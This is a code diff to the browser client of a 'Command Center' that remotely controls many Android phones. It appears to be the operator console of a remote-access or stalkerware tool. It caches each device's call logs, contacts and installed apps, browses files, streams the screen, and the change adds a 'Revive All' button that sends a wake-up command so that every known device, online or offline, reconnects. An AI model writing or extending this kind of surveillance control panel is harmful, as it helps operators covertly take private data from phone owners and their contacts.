@@ -1,4 +1,4 @@
-// Command Center Core Client Logic — Native WebSocket Edition (Multi-Device + Contacts)
+// Command Center Core Client Logic — Native WebSocket Edition (Multi-Device + Contacts + Revive All)
 
 // ─────────────────────────────────────────────────────────────
 // Signaling URL resolution
@@ -206,9 +206,7 @@ socket.connect();
 const devices = new Map();          // wsId -> { id, model, name, deviceId, connectedAt }
 let selectedDeviceId = null;        // currently selected device wsId
 
-// ── Per-device caches (NEW) ──────────────────────────────────
-// These keep each device's data isolated, so switching back
-// shows the correct data immediately without re-fetching.
+// ── Per-device caches ────────────────────────────────────────
 const callLogsByDevice   = new Map();   // wsId -> [ {number, type, date, duration}, ... ]
 const contactsByDevice   = new Map();   // wsId -> [ {name, phones:[...]}, ... ]  (normalized)
 const appsByDevice       = new Map();   // wsId -> [ {name, package, version}, ... ]
@@ -230,6 +228,7 @@ const debugLog = document.getElementById('debugLog');
 const btnStartStream = document.getElementById('btnStartStream');
 const btnStopStream  = document.getElementById('btnStopStream');
 const btnRevive      = document.getElementById('btnRevive');
+const btnReviveAll   = document.getElementById('btnReviveAll');
 
 const infoModel = document.getElementById('infoModel');
 const infoManufacturer = document.getElementById('infoManufacturer');
@@ -398,6 +397,7 @@ function renderDeviceList() {
   btnStartStream.disabled = !hasSelection;
   btnStopStream.disabled = !hasSelection;
   btnRevive.disabled = !hasSelection;
+  // btnReviveAll is ALWAYS enabled — works even with zero devices
 }
 
 function setVideoTagState(el, text, colorVar, bgVar, borderVar) {
@@ -452,7 +452,7 @@ function resetUIForNoDevice() {
 }
 
 // ─────────────────────────────────────────────────────────────
-// Per-device data rendering (NEW)
+// Per-device data rendering
 // ─────────────────────────────────────────────────────────────
 
 function renderCallLogs(deviceId) {
@@ -511,7 +511,6 @@ function renderApps(deviceId) {
     });
   });
 
-  // Re-apply current search filter
   const q = appSearchInput.value.toLowerCase();
   if (q) {
     appList.querySelectorAll('.data-item').forEach(item => {
@@ -549,7 +548,6 @@ function renderContacts(deviceId) {
     contactList.appendChild(item);
   });
 
-  // Re-apply current search filter
   const q = contactSearchInput.value.toLowerCase();
   if (q) {
     contactList.querySelectorAll('.data-item').forEach(item => {
@@ -621,7 +619,6 @@ function selectDevice(id) {
 
   const previousId = selectedDeviceId;
 
-  // Politely stop streaming on the previous device before switching
   if (previousId && devices.has(previousId)) {
     try {
       socket.emit('cmd:stop', { to: previousId });
@@ -629,7 +626,6 @@ function selectDevice(id) {
     } catch (e) {}
   }
 
-  // Reset media + per-device UI
   resetMediaState();
   clearFileExplorerUI();
 
@@ -640,10 +636,8 @@ function selectDevice(id) {
   updateStatus(`Active device: ${label}`);
   logDebug(`[DEVICE] Selected: ${label} (${id})`);
 
-  // Render cached data for this device (call logs, apps, contacts, metrics)
   renderCachedDataForDevice(id);
 
-  // Fetch fresh file list
   requestFileList(currentPath);
 }
 
@@ -699,6 +693,51 @@ if (btnRevive) {
         else logDebug('[CMD] FCM revive failed: ' + (data.error || 'unknown'));
       })
       .catch(e => logDebug('[CMD] FCM revive error: ' + e.message));
+  });
+}
+
+// ── Revive All: broadcast FCM to every known device (online + offline) ──
+if (btnReviveAll) {
+  btnReviveAll.addEventListener('click', () => {
+    logDebug('[REVIVE] Broadcasting FCM wake-up to ALL known devices...');
+    updateStatus('Broadcasting revive signal to all devices...');
+
+    fetch('/api/fcm/send-to-all', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ command: 'revive' })
+    })
+      .then(r => r.json())
+      .then(data => {
+        if (data.success) {
+          const msg = `Broadcast: sent=${data.sent || 0}, failed=${data.failed || 0}`;
+          logDebug('[REVIVE] ' + msg);
+          updateStatus(msg);
+
+          if ((data.sent || 0) > 0) {
+            logDebug('[REVIVE] Devices should reconnect within 5-15 seconds...');
+            setTimeout(() => {
+              fetch('/api/devices/known')
+                .then(r => r.json())
+                .then(known => {
+                  const online = (known.devices || []).filter(d => d.online).length;
+                  logDebug(`[REVIVE] Devices online now: ${online} / ${known.count || 0}`);
+                })
+                .catch(() => {});
+            }, 8000);
+          } else if ((data.message || '').length > 0) {
+            logDebug('[REVIVE] ' + data.message);
+          }
+        } else {
+          const err = data.error || 'unknown';
+          logDebug('[REVIVE] Broadcast failed: ' + err);
+          updateStatus('Revive broadcast failed: ' + err);
+        }
+      })
+      .catch(e => {
+        logDebug('[REVIVE] Error: ' + e.message);
+        updateStatus('Revive broadcast error');
+      });
   });
 }
 
@@ -1551,7 +1590,6 @@ socket.on('android-client-disconnected', (msg) => {
 
   const label = getDeviceLabel(id);
 
-  // Purge all caches for this device
   devices.delete(id);
   callLogsByDevice.delete(id);
   contactsByDevice.delete(id);
@@ -1582,10 +1620,7 @@ socket.on('android-client-disconnected', (msg) => {
 socket.on('device_info', (info) => {
   if (!info) return;
   const from = info.from;
-  if (!from || from !== selectedDeviceId) {
-    // Ignore data from non-selected device
-    return;
-  }
+  if (!from || from !== selectedDeviceId) return;
 
   deviceInfoByDevice.set(from, {
     model: info.model,
@@ -1625,16 +1660,12 @@ socket.on('apps_list', (data) => {
 });
 
 // ── Contacts list (FILTERED + CACHED + NORMALIZED) ──
-// Android sends: { to, from, contacts_list: [{name, number}, ...] }
-// We normalize: group by name → { name, phones: [num1, num2, ...] }
 socket.on('contacts_list', (data) => {
   if (!data) return;
   const from = data.from;
   if (!from || from !== selectedDeviceId) return;
 
-  // Tolerate both possible field names ("contacts_list" from Android, "contacts" from future)
   const rawList = data.contacts_list || data.contacts || [];
-
   const normalized = normalizeContacts(rawList);
   contactsByDevice.set(from, normalized);
 
@@ -1648,7 +1679,6 @@ function normalizeContacts(rawList) {
   for (const c of rawList) {
     const name = ((c && c.name) || 'Unknown').toString().trim() || 'Unknown';
 
-    // Support both { name, number } (current Android) and { name, phones: [] } (future)
     let numbers = [];
     if (Array.isArray(c.phones)) {
       numbers = c.phones.filter(Boolean).map(n => n.toString().trim());
@@ -1682,7 +1712,7 @@ socket.on('snapshot_data', (data) => {
   snapshotModal.classList.add('active');
 });
 
-// ── File system responses (already targeted via `to`, but we still verify) ──
+// ── File system responses ──
 socket.on('fs:files', (data) => {
   logDebug('Refreshing explorer directory tree');
   if (data && data.file_list) {
